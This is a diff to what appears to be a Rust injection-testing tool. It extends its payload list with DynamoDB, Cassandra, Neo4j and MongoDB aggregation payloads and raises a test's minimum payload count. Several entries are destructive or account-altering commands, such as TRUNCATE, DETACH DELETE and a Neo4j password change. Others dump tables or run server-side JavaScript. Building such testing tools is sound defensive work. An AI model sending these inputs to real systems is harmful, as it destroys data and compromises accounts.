@@ -67,6 +67,30 @@ pub fn get_payloads() -> Vec<Payload> {
             ("'===' || '1'==='1", "JavaScript triple equals bypass", Severity::Critical),
             ("1; while(1){}", "Infinite loop payload", Severity::High),
         ];
+        "dynamodb", [
+            ("{\"ExpressionAttributeValues\":{\":v\":true},\"FilterExpression\":\"admin = :v\"}", "DynamoDB attribute filter", Severity::Critical),
+            ("{\"KeyConditionExpression\":\"id = :v\",\"ExpressionAttributeValues\":{\":v\":\"1\"}}", "DynamoDB key condition", Severity::Critical),
+            ("{\"ProjectionExpression\":\"*\",\"TableName\":\"users\"}", "DynamoDB full table scan", Severity::High),
+            ("{\"ScanIndexForward\":false,\"Limit\":100,\"TableName\":\"users\"}", "DynamoDB scan", Severity::High),
+            ("{\"UpdateExpression\":\"SET #a = :v\",\"ExpressionAttributeNames\":{\"#a\":\"admin\"},\"ExpressionAttributeValues\":{\":v\":true}}", "DynamoDB update injection", Severity::Critical),
+        ];
+        "cassandra", [
+            ("SELECT * FROM users WHERE username='admin' ALLOW FILTERING", "Cassandra ALLOW FILTERING", Severity::High),
+            ("TRUNCATE users", "Cassandra TRUNCATE", Severity::Critical),
+            ("CREATE TABLE evil (id int PRIMARY KEY, data text)", "Cassandra table creation", Severity::Critical),
+            ("SELECT * FROM system_schema.tables", "Cassandra schema enumeration", Severity::High),
+        ];
+        "neo4j", [
+            ("MATCH (n) RETURN n LIMIT 100", "Neo4j full node dump", Severity::High),
+            ("MATCH (n) DETACH DELETE n", "Neo4j delete all nodes", Severity::Critical),
+            ("MATCH (u:User {name:'admin'}) RETURN u", "Neo4j user lookup", Severity::High),
+            ("CALL dbms.security.changePassword('hacked')", "Neo4j password change", Severity::Critical),
+        ];
+        "mongodb-agg", [
+            ("{\"$expr\":{\"$gt\":[{\"$strLenCP\":\"$password\"},0]}}", "MongoDB $expr injection", Severity::Critical),
+            ("{\"$function\":{\"body\":\"function(){return db.getCollectionNames()}\",\"args\":[],\"lang\":\"js\"}}", "MongoDB $function", Severity::Critical),
+            ("{\"$accumulator\":{\"init\":\"function(){return 0}\",\"accumulate\":\"function(state,v){return state+1}\",\"accumulateArgs\":[\"$value\"],\"merge\":\"function(s1,s2){return s1+s2}\",\"lang\":\"js\"}}", "MongoDB $accumulator", Severity::Critical),
+        ];
     );
 
     for p in &mut payloads {
@@ -142,7 +166,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 45,
+            payloads.len() >= 55,
             "Must have substantial NoSQL payload coverage, got {}",
             payloads.len()
         );
